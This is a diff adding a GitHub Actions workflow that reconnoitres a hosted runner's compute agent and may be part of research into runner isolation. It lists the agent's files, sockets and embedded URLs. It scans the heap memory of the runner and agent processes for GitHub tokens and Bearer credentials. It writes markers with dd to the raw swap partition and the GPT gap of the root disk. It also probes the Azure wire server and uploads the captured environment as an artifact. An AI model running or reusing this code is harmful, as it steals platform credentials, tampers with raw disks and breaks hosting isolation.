@@ -1,0 +1,140 @@
+name: r9-hca-channel-and-recycle-markers
+on:
+  workflow_dispatch:
+jobs:
+  r9:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: P0 marker seed
+        run: |
+          MARK="R9-RECYCLE-$(date -u +%Y%m%dT%H%M%SZ)-7f3a9c"
+          echo "MARK=$MARK" >> "$GITHUB_OUTPUT"
+          echo "$MARK" | tee "$RUNNER_TEMP/r9-mark.txt" >/dev/null
+          echo "seeded marker: $MARK"
+
+      - name: P1 hca-inventory
+        run: |
+          echo "== unit file =="
+          sudo systemctl cat hosted-compute-agent 2>&1 | sed -n '1,40p'
+          echo "== status =="
+          sudo systemctl status hosted-compute-agent --no-pager -l 2>&1 | sed -n '1,15p'
+          echo "== /opt/hca tree =="
+          sudo ls -laR /opt/hca 2>/dev/null | sed -n '1,60p'
+          echo "== journal tail =="
+          sudo journalctl -u hosted-compute-agent --no-pager 2>&1 | tail -40
+
+      - name: P2 hca-process-fds
+        run: |
+          for P in $(pgrep -f 'hosted-compute-agent' | head -5); do
+            echo "== hca pid $P: $(ps -o user=,args= -p $P | head -c 200)"
+            sudo ls -la /proc/$P/fd 2>/dev/null | sed -n '1,50p'
+          done
+
+      - name: P3 channel-fd-hunt (Listener/Worker peers)
+        run: |
+          echo "== listening/connected unix sockets =="
+          sudo ss -xnp 2>/dev/null | grep -Ei 'hca|runner|listener|worker|agent|dispatch|spawn' | sed -n '1,30p'
+          echo "== established tcp for runner/hca procs =="
+          sudo ss -tnp 2>/dev/null | grep -Ei 'runner|hca|node' | sed -n '1,30p'
+          echo "== /proc/net/unix interesting names =="
+          sudo cat /proc/net/unix 2>/dev/null | grep -iE 'hca|runner|agent|spawn|dispatch|compute' | sed -n '1,20p'
+          for P in $(pgrep -f 'Runner.Listener|Runner.Worker' | head -4); do
+            echo "== runner pid $P ($(cat /proc/$P/comm 2>/dev/null)) socket fds =="
+            sudo ls -la /proc/$P/fd 2>/dev/null | grep -E 'socket|pipe' | sed -n '1,25p'
+          done
+
+      - name: P4 hca-binary-intel
+        run: |
+          HB=$(readlink -f /opt/hca/hosted-compute-agent 2>/dev/null || echo /opt/hca/hosted-compute-agent)
+          echo "binary: $HB"
+          sudo strings -a "$HB" 2>/dev/null | grep -oE 'https?://[a-zA-Z0-9._:/-]+' | sort -u | tee /tmp/r9-hca-urls.txt | sed -n '1,40p'
+          sudo strings -a "$HB" 2>/dev/null | grep -iE '\.github\.net|githubapp\.com|internal|vso\.|pipehandle|agentchannel' | sort -u | sed -n '1,30p'
+          echo "== config-looking files under /opt/hca =="
+          sudo find /opt/hca -maxdepth 3 -type f \( -name '*.json' -o -name '*.conf' -o -name '*.env' -o -name '*.ini' -o -name '*.toml' -o -name '*.yaml' \) 2>/dev/null | tee /tmp/r9-hca-confs.txt | sed -n '1,20p'
+          while read -r F; do echo "-- $F (head)"; sudo head -c 800 "$F" 2>/dev/null; echo; done < /tmp/r9-hca-confs.txt
+
+      - name: P5 heap-cred-scan (Listener + HCA)
+        run: |
+          echo "yama ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
+          sudo python3 - <<'EOF'
+          import re, sys
+          pats = re.compile(rb'(ghu_[A-Za-z0-9]{20,}|ghs_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|Bearer [A-Za-z0-9._-]{25,}|ACTIONS_RUNTIME_TOKEN|\.github\.net[A-Za-z0-9._/-]*)')
+          targets = []
+          try:
+              import subprocess
+              out = subprocess.run(['pgrep', '-f', 'Runner.Listener|hosted-compute-agent'], capture_output=True, text=True).stdout.split()
+              targets = [int(p) for p in out][:6]
+          except Exception as e:
+              print('pgrep fail', e)
+          for pid in targets:
+              try:
+                  comm = open(f'/proc/{pid}/comm').read().strip()
+                  print(f'== pid {pid} ({comm}) heap scan ==')
+                  for line in open(f'/proc/{pid}/maps'):
+                      m = re.match(r'([0-9a-f]+)-([0-9a-f]+)', line)
+                      if m and '[heap]' in line:
+                          lo, hi = int(m.group(1), 16), int(m.group(2), 16)
+                          if hi - lo > 128 * 1024 * 1024: hi = lo + 128 * 1024 * 1024
+                          fd = open(f'/proc/{pid}/mem', 'rb', buffering=0)
+                          fd.seek(lo)
+                          data = fd.read(hi - lo)
+                          fd.close()
+                          for mm in pats.finditer(data):
+                              print(f'  HIT: {mm.group(0)[:120].decode("utf-8", "replace")}')
+              except Exception as e:
+                  print(f'pid {pid} scan error: {e}')
+          EOF
+
+      - name: P6 recycle-marker-plant
+        run: |
+          MARK=$(cat "$RUNNER_TEMP/r9-mark.txt")
+          for D in / /mnt /var/tmp /tmp; do echo "$MARK" | sudo tee "$D/$MARK" >/dev/null && echo "planted: $D/$MARK"; done
+          sync
+          echo "== swap raw plant =="
+          SW=$(awk '$2=="partition"{print $1; exit}' /proc/swaps)
+          if [ -n "$SW" ] && [ -b "$SW" ]; then
+            sudo swapoff -a 2>/dev/null
+            printf '%s\n%.0s' "$MARK" $(seq 1 16) | sudo dd of="$SW" bs=4096 count=1 conv=notrunc 2>&1 | tail -1
+            sudo dd if="$SW" bs=4096 count=1 2>/dev/null | grep -c "$MARK" && echo "swap marker verified"
+            sudo swapon -a 2>/dev/null
+          else
+            echo "no partition swap found (/proc/swaps): $(cat /proc/swaps)"
+          fi
+          echo "== GPT-gap plant =="
+          ROOT=$(findmnt -no SOURCE /)
+          PK=$(lsblk -no PKNAME "$ROOT" 2>/dev/null | head -1)
+          if [ -n "$PK" ] && [ -b "/dev/$PK" ]; then
+            printf '%s\n%.0s' "$MARK" $(seq 1 8) | sudo dd of="/dev/$PK" bs=512 seek=34 count=8 conv=notrunc 2>&1 | tail -1
+            sudo dd if="/dev/$PK" bs=512 skip=34 count=8 2>/dev/null | grep -c "$MARK" && echo "gpt-gap marker verified"
+          else
+            echo "root=$ROOT parent=$PK — no parent block device"
+          fi
+
+      - name: P7 net-reach + internal DNS
+        run: |
+          echo "== azure wire server =="
+          curl -m 4 -sS -o /tmp/ws80 -w 'http:%{http_code}\n' http://168.63.129.16/ 2>&1; head -c 200 /tmp/ws80 2>/dev/null; echo
+          curl -m 4 -sSk -o /dev/null -w 'https:%{http_code}\n' https://168.63.129.16/ 2>&1 || true
+          echo "== neighbors / routes =="
+          ip neigh show 2>/dev/null | sed -n '1,10p'
+          ip -4 route show 2>/dev/null | sed -n '1,10p'
+          echo "== resolv =="
+          cat /etc/resolv.conf 2>/dev/null | grep -v '^#' | sed -n '1,6p'
+          echo "== endpoints from hca strings =="
+          for H in $(grep -oE 'https?://[a-zA-Z0-9._-]+' /tmp/r9-hca-urls.txt 2>/dev/null | sed 's|https\?://||' | sort -u | head -12); do
+            echo "-- $H: $(getent hosts "$H" | head -1)"
+          done
+
+      - name: capture action-process env to artifact
+        uses: ./actions/r9-capture
+
+      - name: upload evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: r9-evidence
+          path: |
+            ${{ runner.temp }}/r9-action-env.txt
+            ${{ runner.temp }}/r9-mark.txt
